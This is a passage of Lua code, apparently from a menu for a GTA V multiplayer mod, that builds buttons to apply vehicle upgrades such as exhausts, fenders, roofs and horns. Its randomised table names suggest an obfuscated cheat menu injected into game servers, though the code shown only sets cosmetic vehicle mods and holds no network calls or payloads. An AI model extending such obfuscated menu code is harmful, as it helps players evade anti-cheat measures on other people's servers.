                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 80
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 7, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil  
                                end
                            elseif curvopt1 == "Side Skirt" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 3)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 3, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 3, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Exhaust" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 4)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 4, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 4, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Frame" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 5)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 5, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 5, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Grille" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 6)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 6, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 6, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Fender" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 8)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 8, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 8, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Right Fender" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 9)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 9, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 9, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Roof" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 10)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 10, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 10, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Trunk" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 37)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 37, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 37, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Horns" then
                                for j = 0, 51, 1 do
                                    RfPsUKHSFWJuBEJuz.rE.LumTable.LumInsert(REVMYmrswsZvxOXvJE.HornyHorn.items, jrnyLearIyzKiSIen.func.GetHornName(j))
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.ComboBox('Horns', REVMYmrswsZvxOXvJE.HornyHorn.items, REVMYmrswsZvxOXvJE.HornyHorn.currentItemIndex, REVMYmrswsZvxOXvJE.HornyHorn.selectedItemIndex, function(currentIndex, selectedIndex)
                                    REVMYmrswsZvxOXvJE.HornyHorn.currentItemIndex = currentIndex 
                                    REVMYmrswsZvxOXvJE.HornyHorn.selectedItemIndex = selectedIndex
                                end, 3, 50) then nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 14, REVMYmrswsZvxOXvJE.HornyHorn.selectedItemIndex - 1) DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!') end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Vanity Plates" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 26)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 26, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 26, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil          
                                end
                            elseif curvopt1 == "Trim" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 27)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 27, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 27, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Ornaments" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 28)
                                for j = 0, modCount, 1 do
                                    local modName = nlFXKkFxuKQAk.natives.GetModTextLabel(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 28, j)
                                    jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff + 20
                                    if jrnyLearIyzKiSIen.config.vehoff1 == 110 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 180
                                        jrnyLearIyzKiSIen.config.vehoff4 = jrnyLearIyzKiSIen.config.vehoff4 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff4
                                    elseif jrnyLearIyzKiSIen.config.vehoff1 == 50 and jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 110
                                        jrnyLearIyzKiSIen.config.vehoff3 = jrnyLearIyzKiSIen.config.vehoff3 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff3
                                    elseif jrnyLearIyzKiSIen.config.vehoff > 255 then
                                        jrnyLearIyzKiSIen.config.vehoff1 = 50
                                        jrnyLearIyzKiSIen.config.vehoff2 = jrnyLearIyzKiSIen.config.vehoff2 + 20
                                        jrnyLearIyzKiSIen.config.vehoff = jrnyLearIyzKiSIen.config.vehoff2
                                    end
                                    if nlFXKkFxuKQAk.natives.GetLabelText(modName) == 'NULL' then
                                        namerino = 'Stock'
                                    else
                                        namerino = nlFXKkFxuKQAk.natives.GetLabelText(modName)
                                    end
                                    if DmSgpcIoUEJtyTfBBt.Mfunc.Button(namerino, 3, jrnyLearIyzKiSIen.config.vehoff, jrnyLearIyzKiSIen.config.vehoff1) then
                                        nlFXKkFxuKQAk.natives.SetVehicleMod(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 28, j)
                                        DmSgpcIoUEJtyTfBBt.Mfunc.ShowNotification('Applied Upgrade!')      
                                    end
                                end
                                if DmSgpcIoUEJtyTfBBt.Mfunc.Button('Back', 3, 20, 175) then
                                    curvopt = nil
                                end
                            elseif curvopt1 == "Dashboard" then
                                local modCount = nlFXKkFxuKQAk.natives.GetNumVehicleMods(nlFXKkFxuKQAk.natives.GetVehiclePedIsIn(nlFXKkFxuKQAk.natives.GetPlayerPed(-1), false), 29)
                                for j = 0, modCount, 1 do
